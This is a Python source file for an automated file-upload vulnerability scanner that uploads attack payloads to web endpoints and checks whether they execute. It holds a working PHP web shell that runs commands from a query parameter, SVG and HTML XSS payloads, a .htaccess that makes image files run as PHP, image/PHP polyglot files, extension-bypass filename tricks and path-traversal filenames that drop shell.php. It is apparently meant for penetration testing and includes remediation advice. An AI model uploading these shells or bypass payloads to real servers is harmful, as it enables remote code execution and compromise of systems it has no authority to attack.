"""
Enhanced File Upload Scanner V2

MITM-first file upload vulnerability scanner that extends BaseAttackScanner.
Uses polyglot files, extension bypasses, and execution verification.
"""

import asyncio
import logging
import os
import io
import random
import string
import hashlib
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse
import time

from attacks.web.base_attack_scanner import BaseAttackScanner, AttackResult
from attacks.web.file_upload.polyglot_generator import (
    create_polyglot,
    IMAGE_HEADERS,
    PHP_SHELLS,
    OTHER_SHELLS,
    TEST_FILES_DIR,
    list_test_files,
    get_test_file_path
)

logger = logging.getLogger(__name__)


@dataclass
class UploadTestResult:
    """Result of an upload test."""
    success: bool
    uploaded_path: Optional[str] = None
    response_code: int = 0
    response_body: str = ""
    file_accessible: bool = False
    code_executed: bool = False
    execution_evidence: str = ""


class FileUploadScannerV2(BaseAttackScanner):
    """
    Enhanced file upload vulnerability scanner.
    
    Features:
    - MITM-first architecture (all traffic captured)
    - Polyglot file generation (GIF/JPEG/PNG + PHP/ASP/JSP)
    - Extension bypass techniques (double extension, null byte, case)
    - MIME type manipulation
    - Content-Type confusion
    - Magic bytes preservation
    - Path traversal in filename
    - Execution verification
    - Server-side validation bypass
    
    Vulnerabilities detected:
    - Unrestricted file upload (RCE)
    - Extension bypass leading to code execution
    - MIME type bypass
    - Content-Type bypass
    - Stored XSS via file upload
    - Path traversal via filename
    """
    
    scanner_name = "file_upload_v2"
    scanner_description = "Enhanced file upload vulnerability scanner with polyglot support"
    
    # Unique marker for detection
    EXECUTION_MARKER = "JARWIS_UPLOAD_EXEC_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    # Dangerous extensions to test
    DANGEROUS_EXTENSIONS = [
        # PHP
        '.php', '.php3', '.php4', '.php5', '.php7', '.php8',
        '.phtml', '.phar', '.phps', '.pht', '.pgif',
        # ASP
        '.asp', '.aspx', '.ashx', '.asa', '.asmx', '.ascx',
        # JSP
        '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
        # Server-side
        '.exe', '.sh', '.py', '.pl', '.rb', '.cgi',
        # Config
        '.htaccess', '.htpasswd', '.config', '.ini', '.env',
        # Client-side (XSS)
        '.svg', '.html', '.htm', '.shtml', '.xml', '.xhtml',
    ]
    
    # Extension bypass techniques
    EXTENSION_BYPASSES = [
        # Double extensions
        ('{ext}.jpg', 'double_ext_jpg'),
        ('{ext}.png', 'double_ext_png'),
        ('{ext}.gif', 'double_ext_gif'),
        ('{ext}.pdf', 'double_ext_pdf'),
        ('jpg.{ext}', 'reverse_double'),
        ('png.{ext}', 'reverse_double_png'),
        
        # Null byte injection (legacy PHP < 5.3.4)
        ('{ext}%00.jpg', 'null_byte_encoded'),
        ('{ext}\x00.jpg', 'null_byte_raw'),
        
        # Case variations
        ('{EXT}', 'uppercase'),
        ('{Ext}', 'mixed_case'),
        ('{eXt}', 'random_case'),
        
        # Trailing characters
        ('{ext}.', 'trailing_dot'),
        ('{ext}..', 'double_trailing_dot'),
        ('{ext} ', 'trailing_space'),
        ('{ext}...', 'triple_dot'),
        ('{ext};.jpg', 'semicolon'),
        
        # Windows specific
        ('{ext}::$DATA', 'ads_data'),
        ('{ext}:$DATA', 'ads_short'),
        
        # Alternate extensions
        ('.module', 'module'),
        ('.inc', 'inc'),
        ('.phtml', 'phtml'),
    ]
    
    # MIME types to test
    MIME_TYPE_BYPASSES = [
        'image/jpeg',
        'image/png', 
        'image/gif',
        'application/octet-stream',
        'text/plain',
        'application/pdf',
        'image/svg+xml',
    ]
    
    # Common upload endpoints
    UPLOAD_ENDPOINTS = [
        '/upload', '/api/upload', '/api/files', '/api/images',
        '/file/upload', '/files/upload', '/image/upload',
        '/api/v1/upload', '/api/v1/files', '/upload.php',
        '/admin/upload', '/user/upload', '/profile/upload',
        '/api/avatar', '/avatar/upload', '/media/upload',
        '/api/media', '/attachments', '/api/attachments',
        '/documents', '/api/documents', '/import',
    ]
    
    def __init__(self, http_client, config: Optional[Dict[str, Any]] = None):
        """
        Initialize FileUploadScannerV2.
        
        Args:
            http_client: MITM-aware HTTP client
            config: Scanner configuration
        """
        super().__init__(http_client, config)
        
        self.config = config or {}
        self.timeout = self.config.get("timeout", 30)
        self.delay_between_requests = self.config.get("delay_ms", 200) / 1000.0
        self.verify_execution = self.config.get("verify_execution", True)
        self.test_all_extensions = self.config.get("test_all_extensions", False)
        
        # Results tracking
        self.upload_locations: Dict[str, str] = {}
        self.successful_uploads: List[UploadTestResult] = []
    
    def _generate_shell_content(self, shell_type: str) -> bytes:
        """Generate shell content with unique marker."""
        if shell_type == "php":
            return f'<?php echo "{self.EXECUTION_MARKER}"; system($_GET["cmd"]); ?>'.encode()
        elif shell_type == "asp":
            return f'<%Response.Write("{self.EXECUTION_MARKER}")%>'.encode()
        elif shell_type == "jsp":
            return f'<%out.print("{self.EXECUTION_MARKER}");%>'.encode()
        elif shell_type == "svg":
            return f'''<svg xmlns="http://www.w3.org/2000/svg" onload="alert('{self.EXECUTION_MARKER}')">
<text>{self.EXECUTION_MARKER}</text>
</svg>'''.encode()
        elif shell_type == "html":
            return f'<script>document.write("{self.EXECUTION_MARKER}")</script>'.encode()
        elif shell_type == "htaccess":
            return b'AddType application/x-httpd-php .jpg .png .gif'
        else:
            return f'MARKER:{self.EXECUTION_MARKER}'.encode()
    
    def _generate_polyglot(self, image_type: str, shell_type: str) -> bytes:
        """Generate a polyglot file (valid image + shell code)."""
        header = IMAGE_HEADERS.get(image_type, IMAGE_HEADERS["gif"])
        shell = self._generate_shell_content(shell_type)
        return header + b"\n" + shell
    
    def _generate_filename(self, extension: str, bypass_type: str = "") -> str:
        """Generate a test filename."""
        random_part = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        if bypass_type:
            return f"jarwis_test_{random_part}_{bypass_type}{extension}"
        return f"jarwis_test_{random_part}{extension}"
    
    async def scan_upload_endpoint(
        self,
        url: str,
        form_field: str = "file",
        additional_data: Optional[Dict[str, str]] = None
    ) -> List[AttackResult]:
        """
        Scan an upload endpoint for vulnerabilities.
        
        Args:
            url: Upload endpoint URL
            form_field: Name of the file form field
            additional_data: Additional form data to send
            
        Returns:
            List of discovered vulnerabilities
        """
        results = []
        logger.info(f"Scanning upload endpoint: {url}")
        
        # Test 1: Direct dangerous extension upload
        logger.debug("Testing direct dangerous extensions...")
        for ext in self.DANGEROUS_EXTENSIONS[:10]:  # Limit for performance
            shell_type = self._get_shell_type_for_extension(ext)
            content = self._generate_shell_content(shell_type)
            filename = self._generate_filename(ext)
            
            result = await self._attempt_upload(
                url, form_field, filename, content,
                "application/octet-stream", additional_data
            )
            
            if result.success:
                vuln_result = await self._verify_and_report(
                    url, filename, ext, result, "direct_extension",
                    f"Direct upload of {ext} file accepted"
                )
                if vuln_result:
                    results.append(vuln_result)
            
            await asyncio.sleep(self.delay_between_requests)
        
        # Test 2: Extension bypass techniques
        logger.debug("Testing extension bypass techniques...")
        for bypass_template, bypass_name in self.EXTENSION_BYPASSES[:10]:
            for base_ext in ['.php', '.asp', '.jsp'][:2]:
                # Apply bypass to extension
                if '{ext}' in bypass_template:
                    ext = bypass_template.replace('{ext}', base_ext)
                elif '{EXT}' in bypass_template:
                    ext = bypass_template.replace('{EXT}', base_ext.upper())
                elif '{Ext}' in bypass_template:
                    ext = bypass_template.replace('{Ext}', base_ext.title())
                else:
                    ext = bypass_template
                
                shell_type = self._get_shell_type_for_extension(base_ext)
                content = self._generate_shell_content(shell_type)
                filename = self._generate_filename(ext, bypass_name)
                
                result = await self._attempt_upload(
                    url, form_field, filename, content,
                    "image/jpeg", additional_data
                )
                
                if result.success:
                    vuln_result = await self._verify_and_report(
                        url, filename, ext, result, bypass_name,
                        f"Extension bypass via {bypass_name}"
                    )
                    if vuln_result:
                        results.append(vuln_result)
                
                await asyncio.sleep(self.delay_between_requests)
        
        # Test 3: Polyglot files (image header + shell)
        logger.debug("Testing polyglot files...")
        for img_type in ["gif", "jpeg", "png"]:
            for shell_type in ["php", "asp"]:
                content = self._generate_polyglot(img_type, shell_type)
                
                # Try various extension combinations
                ext_combos = [
                    f".{img_type}",  # Just image extension
                    f".{shell_type}.{img_type}",  # Shell first
                    f".{img_type}.{shell_type}",  # Image first
                ]
                
                for ext in ext_combos:
                    filename = self._generate_filename(ext, f"polyglot_{img_type}_{shell_type}")
                    
                    result = await self._attempt_upload(
                        url, form_field, filename, content,
                        f"image/{img_type}", additional_data
                    )
                    
                    if result.success:
                        vuln_result = await self._verify_and_report(
                            url, filename, ext, result, "polyglot",
                            f"Polyglot file ({img_type}+{shell_type}) accepted"
                        )
                        if vuln_result:
                            results.append(vuln_result)
                    
                    await asyncio.sleep(self.delay_between_requests)
        
        # Test 4: MIME type confusion
        logger.debug("Testing MIME type confusion...")
        for mime in self.MIME_TYPE_BYPASSES:
            content = self._generate_shell_content("php")
            filename = self._generate_filename(".php")
            
            result = await self._attempt_upload(
                url, form_field, filename, content,
                mime, additional_data
            )
            
            if result.success:
                vuln_result = await self._verify_and_report(
                    url, filename, ".php", result, "mime_bypass",
                    f"MIME type bypass using {mime}"
                )
                if vuln_result:
                    results.append(vuln_result)
            
            await asyncio.sleep(self.delay_between_requests)
        
        # Test 5: SVG XSS
        logger.debug("Testing SVG XSS...")
        svg_xss = self._generate_shell_content("svg")
        result = await self._attempt_upload(
            url, form_field, "test.svg", svg_xss,
            "image/svg+xml", additional_data
        )
        
        if result.success:
            vuln_result = await self._verify_and_report(
                url, "test.svg", ".svg", result, "svg_xss",
                "SVG file with XSS payload accepted"
            )
            if vuln_result:
                results.append(vuln_result)
        
        # Test 6: .htaccess upload (Apache)
        logger.debug("Testing .htaccess upload...")
        htaccess_content = self._generate_shell_content("htaccess")
        result = await self._attempt_upload(
            url, form_field, ".htaccess", htaccess_content,
            "text/plain", additional_data
        )
        
        if result.success:
            results.append(AttackResult(
                scanner_name=self.scanner_name,
                vulnerability_type="unrestricted_file_upload",
                severity="critical",
                url=url,
                parameter=form_field,
                payload=".htaccess upload",
                evidence=".htaccess file upload accepted - can override server config",
                confidence=0.9,
                remediation="Block upload of .htaccess and other server configuration files",
            ))
        
        # Test 7: Path traversal in filename
        logger.debug("Testing path traversal in filename...")
        traversal_names = [
            "../../../tmp/shell.php",
            "..\\..\\..\\tmp\\shell.php",
            "....//....//....//tmp/shell.php",
            "%2e%2e%2fshell.php",
        ]
        
        for trav_name in traversal_names:
            content = self._generate_shell_content("php")
            result = await self._attempt_upload(
                url, form_field, trav_name, content,
                "application/octet-stream", additional_data
            )
            
            if result.success:
                results.append(AttackResult(
                    scanner_name=self.scanner_name,
                    vulnerability_type="path_traversal_upload",
                    severity="critical",
                    url=url,
                    parameter=form_field,
                    payload=trav_name,
                    evidence="Path traversal in filename accepted",
                    confidence=0.85,
                    remediation="Sanitize filenames and use random names for storage",
                ))
            
            await asyncio.sleep(self.delay_between_requests)
        
        return results
    
    async def _attempt_upload(
        self,
        url: str,
        field_name: str,
        filename: str,
        content: bytes,
        content_type: str,
        additional_data: Optional[Dict[str, str]] = None
    ) -> UploadTestResult:
        """
        Attempt to upload a file.
        
        Returns:
            UploadTestResult with success status and details
        """
        try:
            # Prepare multipart data
            files = {
                field_name: (filename, io.BytesIO(content), content_type)
            }
            
            data = additional_data or {}
            
            response = await self.send_payload(
                url=url,
                method="POST",
                files=files,
                data=data,
                timeout=self.timeout
            )
            
            status_code = response.status_code if hasattr(response, 'status_code') else 200
            response_body = response.text if hasattr(response, 'text') else str(response.content)
            
            # Check if upload was accepted
            success = status_code in [200, 201, 202, 204]
            
            # Try to extract uploaded file path from response
            uploaded_path = self._extract_upload_path(response_body, filename)
            
            return UploadTestResult(
                success=success,
                uploaded_path=uploaded_path,
                response_code=status_code,
                response_body=response_body[:1000],
            )
            
        except Exception as e:
            logger.debug(f"Upload attempt failed: {e}")
            return UploadTestResult(success=False)
    
    def _extract_upload_path(self, response_body: str, filename: str) -> Optional[str]:
        """Try to extract the uploaded file path from response."""
        import re
        
        # Common patterns for upload response
        patterns = [
            r'"url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'"location"\s*:\s*"([^"]+)"',
            r'href="([^"]*' + re.escape(filename) + r'[^"]*)"',
            r'src="([^"]*' + re.escape(filename.split('.')[0]) + r'[^"]*)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_body, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    async def _verify_and_report(
        self,
        upload_url: str,
        filename: str,
        extension: str,
        upload_result: UploadTestResult,
        bypass_type: str,
        description: str
    ) -> Optional[AttackResult]:
        """
        Verify if uploaded file can be accessed/executed and create report.
        """
        severity = "high"  # Default
        evidence = description
        code_executed = False
        
        # Try to verify execution if we have a path
        if upload_result.uploaded_path and self.verify_execution:
            # Build possible access URLs
            access_urls = self._build_access_urls(upload_url, upload_result.uploaded_path, filename)
            
            for access_url in access_urls:
                try:
                    response = await self.send_payload(
                        url=access_url,
                        method="GET",
                        timeout=10
                    )
                    
                    response_text = response.text if hasattr(response, 'text') else ""
                    
                    if self.EXECUTION_MARKER in response_text:
                        code_executed = True
                        severity = "critical"
                        evidence = f"CODE EXECUTION CONFIRMED! Marker found at {access_url}"
                        break
                    
                except Exception as e:
                    logger.debug(f"Verification request failed: {e}")
        
        # Determine severity based on extension and execution
        if code_executed:
            severity = "critical"
        elif extension in ['.php', '.asp', '.aspx', '.jsp', '.exe', '.sh']:
            severity = "critical"  # Dangerous even without verification
        elif extension in ['.svg', '.html', '.htm']:
            severity = "high"  # XSS potential
        elif extension in ['.htaccess', '.config']:
            severity = "critical"  # Server config
        
        return AttackResult(
            scanner_name=self.scanner_name,
            vulnerability_type="unrestricted_file_upload",
            severity=severity,
            url=upload_url,
            parameter=filename,
            payload=f"Bypass: {bypass_type}, Extension: {extension}",
            evidence=evidence,
            request_data={
                "filename": filename,
                "bypass_type": bypass_type,
                "extension": extension,
            },
            response_snippet=upload_result.response_body[:300],
            confidence=0.95 if code_executed else 0.75,
            remediation=(
                "1. Validate file type by content (magic bytes), not extension\n"
                "2. Use whitelist of allowed extensions\n"
                "3. Rename files on upload with random names\n"
                "4. Store uploads outside web root\n"
                "5. Implement content-type validation\n"
                "6. Use antivirus scanning on uploads\n"
                "7. Set proper permissions on upload directory"
            ),
        )
    
    def _build_access_urls(
        self,
        upload_url: str,
        uploaded_path: str,
        filename: str
    ) -> List[str]:
        """Build possible URLs to access the uploaded file."""
        parsed = urlparse(upload_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        urls = []
        
        # If we have a full path from response
        if uploaded_path:
            if uploaded_path.startswith('http'):
                urls.append(uploaded_path)
            elif uploaded_path.startswith('/'):
                urls.append(f"{base_url}{uploaded_path}")
            else:
                urls.append(f"{base_url}/{uploaded_path}")
        
        # Common upload directories
        common_dirs = [
            '/uploads/', '/files/', '/images/', '/media/',
            '/static/uploads/', '/public/uploads/', '/content/',
            '/assets/uploads/', '/data/', '/tmp/',
        ]
        
        for dir_path in common_dirs:
            urls.append(f"{base_url}{dir_path}{filename}")
        
        return urls
    
    def _get_shell_type_for_extension(self, extension: str) -> str:
        """Get the appropriate shell type for an extension."""
        ext = extension.lower().strip('.')
        
        if ext in ['php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'phar']:
            return "php"
        elif ext in ['asp', 'aspx', 'ashx', 'asa']:
            return "asp"
        elif ext in ['jsp', 'jspx', 'jsw', 'jsv']:
            return "jsp"
        elif ext == 'svg':
            return "svg"
        elif ext in ['html', 'htm', 'shtml']:
            return "html"
        elif ext == 'htaccess':
            return "htaccess"
        else:
            return "generic"
    
    async def scan_request(
        self,
        method: str,
        url: str,
        headers: Dict[str, str],
        body: Optional[str] = None,
        **kwargs
    ) -> List[AttackResult]:
        """
        Scan a captured request for file upload vulnerabilities.
        
        Called by orchestrator for each captured request.
        """
        results = []
        
        # Check if this looks like an upload endpoint
        url_lower = url.lower()
        content_type = headers.get('Content-Type', '').lower()
        
        is_upload_related = (
            any(kw in url_lower for kw in ['upload', 'file', 'image', 'media', 'attach', 'avatar']) or
            'multipart/form-data' in content_type
        )
        
        if is_upload_related and method == "POST":
            # Extract form field name from content-type if multipart
            form_field = "file"  # Default
            
            if 'multipart/form-data' in content_type:
                # This is likely an upload request
                results = await self.scan_upload_endpoint(url, form_field)
        
        return results
    
    def get_payloads(self) -> List[str]:
        """Get list of test payloads (for base class compatibility)."""
        return [f"polyglot_{img}_{shell}" for img in ["gif", "jpeg", "png"] for shell in ["php", "asp"]]
    
    def detect_vulnerability(self, response: Any, payload: str) -> bool:
        """Detect if upload was successful (for base class compatibility)."""
        if hasattr(response, 'status_code'):
            return response.status_code in [200, 201, 202]
        return False


async def scan_common_endpoints(scanner: FileUploadScannerV2, base_url: str) -> List[AttackResult]:
    """
    Convenience function to scan common upload endpoints.
    
    Args:
        scanner: Configured FileUploadScannerV2 instance
        base_url: Target base URL
        
    Returns:
        List of discovered vulnerabilities
    """
    all_results = []
    
    for endpoint in scanner.UPLOAD_ENDPOINTS:
        url = urljoin(base_url, endpoint)
        
        try:
            results = await scanner.scan_upload_endpoint(url)
            all_results.extend(results)
        except Exception as e:
            logger.debug(f"Error scanning {url}: {e}")
        
        await asyncio.sleep(0.5)  # Rate limiting between endpoints
    
    return all_results
